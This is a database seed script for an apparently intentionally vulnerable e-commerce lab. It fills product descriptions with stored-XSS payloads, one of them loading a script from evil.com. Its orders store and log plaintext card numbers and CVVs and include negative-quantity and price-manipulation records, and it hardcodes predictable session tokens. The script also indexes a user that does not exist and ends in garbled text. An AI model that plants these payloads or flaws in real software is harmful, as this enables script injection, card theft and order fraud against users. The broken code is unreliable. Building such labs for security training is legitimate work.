const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const { connectDB } = require('./config');
const User = require('../server/models/User');
const Product = require('../server/models/Product');
const Order = require('../server/models/Order');

// Sample data for e-commerce application
const seedDatabase = async () => {
  try {
    console.log('Starting database seeding...');
    
    // Connect to database
    await connectDB();
    
    // Clear existing data
    console.log('Clearing existing data...');
    await User.deleteMany({});
    await Product.deleteMany({});
    await Order.deleteMany({});
    
    // Create user accounts with proper password hashing
    console.log('Creating user accounts...');
    
    const users = [
      {
        username: 'admin',
        email: 'admin@ecommerce.com',
        password: await bcrypt.hash('admin123', 12),
        role: 'admin',
        profile: {
          firstName: 'Admin',
          lastName: 'User',
          address: '123 Admin Street, Admin City, AC 12345',
          phone: '555-0001'
        }
      },
      {
        username: 'user',
        email: 'user@ecommerce.com',
        password: await bcrypt.hash('user123', 12),
        role: 'user',
        profile: {
          firstName: 'Regular',
          lastName: 'User',
          address: '456 User Avenue, User Town, UT 67890',
          phone: '555-0002'
        }
      },
      {
        username: 'test',
        email: 'test@ecommerce.com',
        password: await bcrypt.hash('test123', 12),
        role: 'user',
        profile: {
          firstName: 'Test',
          lastName: 'Account',
          address: '789 Test Boulevard, Test City, TC 11111',
          phone: '555-0003'
        }
      }
    ];
    
    const createdUsers = await User.insertMany(users);
    console.log(`Created ${createdUsers.length} user accounts`);
    console.log('Creating products with XSS vulnerabilities...');
    
    const products = [
      {
        name: 'Laptop Computer',
        description: 'High-performance laptop <script>alert("XSS in product description!")</script> perfect for work and gaming.',
        price: 999.99,
        category: 'Electronics',
        imageUrl: '/uploads/products/laptop.jpg',
        stock: 10,
        createdBy: createdUsers[0]._id // Admin user
      },
      {
        name: 'Smartphone',
        description: 'Latest smartphone with <img src="x" onerror="alert(\'Stored XSS via image tag\')" /> advanced features.',
        price: 699.99,
        category: 'Electronics',
        imageUrl: '/uploads/products/phone.jpg',
        stock: 25,
        createdBy: createdUsers[0]._id
      },
      {
        name: 'Coffee Mug',
        description: 'Premium coffee mug <svg onload="alert(\'SVG XSS payload\')" /> for your morning brew.',
        price: 15.99,
        category: 'Home & Kitchen',
        imageUrl: '/uploads/products/mug.jpg',
        stock: 50,
        createdBy: createdUsers[1]._id // Regular user
      },
      {
        name: 'Gaming Mouse',
        description: 'Professional gaming mouse <iframe src="javascript:alert(\'iframe XSS\')" /> with RGB lighting.',
        price: 79.99,
        category: 'Electronics',
        imageUrl: '/uploads/products/mouse.jpg',
        stock: 30,
        createdBy: createdUsers[0]._id
      },
      {
        name: 'T-Shirt',
        description: 'Comfortable cotton t-shirt <style>body{background:red}</style> available in multiple colors.',
        price: 19.99,
        category: 'Clothing',
        imageUrl: '/uploads/products/tshirt.jpg',
        stock: 100,
        createdBy: createdUsers[1]._id
      },
      {
        name: 'Book: Web Security',
        description: 'Learn web security <script src="http://evil.com/malicious.js"></script> fundamentals and best practices.',
        price: 39.99,
        category: 'Books',
        imageUrl: '/uploads/products/book.jpg',
        stock: 15,
        createdBy: createdUsers[0]._id
      },
      {
        name: 'Wireless Headphones',
        description: 'Premium wireless headphones <object data="javascript:alert(\'Object XSS\')" /> with noise cancellation.',
        price: 199.99,
        category: 'Electronics',
        imageUrl: '/uploads/products/headphones.jpg',
        stock: 20,
        createdBy: createdUsers[4]._id // Moderator
      },
      {
        name: 'Keyboard',
        description: 'Mechanical keyboard <embed src="javascript:alert(\'Embed XSS\')" /> for programmers.',
        price: 129.99,
        category: 'Electronics',
        imageUrl: '/uploads/products/keyboard.jpg',
        stock: 35,
        createdBy: createdUsers[0]._id
      },
      {
        name: 'Water Bottle',
        description: 'Stainless steel water bottle <link rel="stylesheet" href="javascript:alert(\'CSS XSS\')" /> keeps drinks cold.',
        price: 24.99,
        category: 'Sports & Outdoors',
        imageUrl: '/uploads/products/bottle.jpg',
        stock: 75,
        createdBy: createdUsers[1]._id
      },
      {
        name: 'Backpack',
        description: 'Durable travel backpack <meta http-equiv="refresh" content="0;url=javascript:alert(\'Meta XSS\')" /> with multiple compartments.',
        price: 89.99,
        category: 'Travel',
        imageUrl: '/uploads/products/backpack.jpg',
        stock: 40,
        createdBy: createdUsers[2]._id // Test user
      }
    ];
    
    const createdProducts = await Product.insertMany(products);
    console.log(`Created ${createdProducts.length} products with XSS payloads`);
    
    // Log XSS payloads for testing reference (vulnerability)
    console.log('XSS payloads embedded in product descriptions:');
    createdProducts.forEach(product => {
      const xssMatch = product.description.match(/<[^>]*>/g);
      if (xssMatch) {
        console.log(`- ${product.name}: ${xssMatch.join(', ')}`);
      }
    });
    // Create sample orders with business logic vulnerabilities
    console.log('Creating sample orders with vulnerabilities...');
    
    const orders = [
      {
        userId: createdUsers[1]._id, // Regular user
        orderNumber: 'ORD-001-1735097464000',
        items: [
          {
            productId: createdProducts[0]._id, // Laptop
            quantity: 1,
            price: 999.99,
            name: 'Laptop Computer'
          },
          {
            productId: createdProducts[3]._id, // Gaming Mouse
            quantity: 2,
            price: 79.99,
            name: 'Gaming Mouse'
          }
        ],
        totalAmount: 1159.97,
        status: 'delivered',
        paymentInfo: {
          // VULNERABILITY: Store payment info in plaintext
          cardNumber: '4532-1234-5678-9012',
          expiryDate: '12/25',
          cvv: '123',
          cardholderName: 'Regular User',
          billingAddress: {
            street: '456 User Avenue',
            city: 'User Town',
            state: 'UT',
            zipCode: '67890',
            country: 'USA'
          }
        },
        shippingAddress: {
          street: '456 User Avenue',
          city: 'User Town',
          state: 'UT',
          zipCode: '67890',
          country: 'USA'
        }
      },
      {
        userId: createdUsers[2]._id, // Test user
        orderNumber: 'ORD-002-1735097464001',
        items: [
          {
            productId: createdProducts[1]._id, // Smartphone
            quantity: -1, // VULNERABILITY: Negative quantity for credit generation
            price: 699.99,
            name: 'Smartphone'
          },
          {
            productId: createdProducts[2]._id, // Coffee Mug
            quantity: 5,
            price: 15.99,
            name: 'Coffee Mug'
          }
        ],
        totalAmount: -620.04, // VULNERABILITY: Negative total due to negative quantity
        status: 'pending',
        paymentInfo: {
          // VULNERABILITY: Store payment info in plaintext
          cardNumber: '5555-4444-3333-2222',
          expiryDate: '06/26',
          cvv: '456',
          cardholderName: 'Test Account',
          billingAddress: {
            street: '789 Test Boulevard',
            city: 'Test City',
            state: 'TC',
            zipCode: '11111',
            country: 'USA'
          }
        },
        shippingAddress: {
          street: '789 Test Boulevard',
          city: 'Test City',
          state: 'TC',
          zipCode: '11111',
          country: 'USA'
        }
      },
      {
        userId: createdUsers[1]._id, // Regular user (second order)
        orderNumber: 'ORD-003-1735097464002',
        items: [
          {
            productId: createdProducts[4]._id, // T-Shirt
            quantity: 3,
            price: 0.01, // VULNERABILITY: Price manipulation - should be 19.99
            name: 'T-Shirt'
          }
        ],
        totalAmount: 0.03, // VULNERABILITY: Manipulated total
        status: 'shipped',
        paymentInfo: {
          // VULNERABILITY: Store payment info in plaintext
          cardNumber: '4111-1111-1111-1111',
          expiryDate: '03/27',
          cvv: '789',
          cardholderName: 'Regular User',
          billingAddress: {
            street: '456 User Avenue',
            city: 'User Town',
            state: 'UT',
            zipCode: '67890',
            country: 'USA'
          }
        },
        shippingAddress: {
          street: '456 User Avenue',
          city: 'User Town',
          state: 'UT',
          zipCode: '67890',
          country: 'USA'
        }
      }
    ];
    
    const createdOrders = await Order.insertMany(orders);
    console.log(`Created ${createdOrders.length} sample orders with vulnerabilities`);
    
    // Log payment information (vulnerability - sensitive data exposure)
    console.log('Sample payment information (VULNERABILITY - exposed in logs):');
    createdOrders.forEach((order, index) => {
      console.log(`Order ${index + 1}:`, {
        cardNumber: order.paymentInfo.cardNumber,
        cvv: order.paymentInfo.cvv,
        total: order.totalAmount
      });
    });
    
    // Create additional test scenarios for security testing
    console.log('Setting up additional test scenarios...');
    
    // VULNERABILITY: Create predictable session tokens for testing
    const sessionTokens = [
      'sess_1234567890_001',
      'sess_1234567891_002',
      'sess_1234567892_003',
      'token_admin_123',
      'token_user_456',
      'session_test_789'
    ];
    
    console.log('Predictable session tokens for testing:', sessionTokens);
    
    // VULNERABILITY: Log database statistics with sensitive information
    const dbStats = {
      totalUsers: createdUsers.length,
      adminUsers: createdUsers.filter(u => u.role === 'admin').length,
      totalProducts: createdProducts.length,
      productsWithXSS: createdProducts.filter(p => p.description.includes('<')).length,
      totalOrders: createdOrders.length,
      ordersWithNegativeQuantity: createdOrders.filter(o => 
        o.items.some(item => item.quantity < 0)
      ).length,
      ordersWithManipulatedPrices: createdOrders.filter(o => 
        o.items.some(item => item.price < 1)
      ).length
    };
    
    console.log('Database seeding completed successfully!');
    console.log('Vulnerability statistics:', dbStats);
    
    // VULNERABILITY: Expose database connection info
    console.log('Database connection details:', {
      host: mongoose.connection.host,
      port: mongoose.connection.port,
      name: mongoose.connection.name
    });
    
    return {
      users: createdUsers,
      products: createdProducts,
      orders: createdOrders,
      statistics: dbStats
    };
    
  } catch (error) {
    console.error('Database seeding failed:');
    console.error('Error:', error.message);
    console.error('Stack:', error.stack); // Stack trace exposure - vulnerability
    throw error;
  }
};

// Export seeding function
module.exports = {
  seedDatabase
};

// Run seeding if this file is executed directly
if (require.main === module) {
  seedDatabase()
    .then((result) => {
      console.log('Database seeding script completed successfully');
      console.log('Summary:', {
        usersCreated: result.users.length,
        productsCreated: result.products.length,
        ordersCreated: result.orders.length
      });
      process.exit(0);
    })
    .catch((error) => {
      console.error('Database seeding script failed:', error);
      process.exit(1);
    });
}/ /   D a t a b a s e   s e e d i n g  
 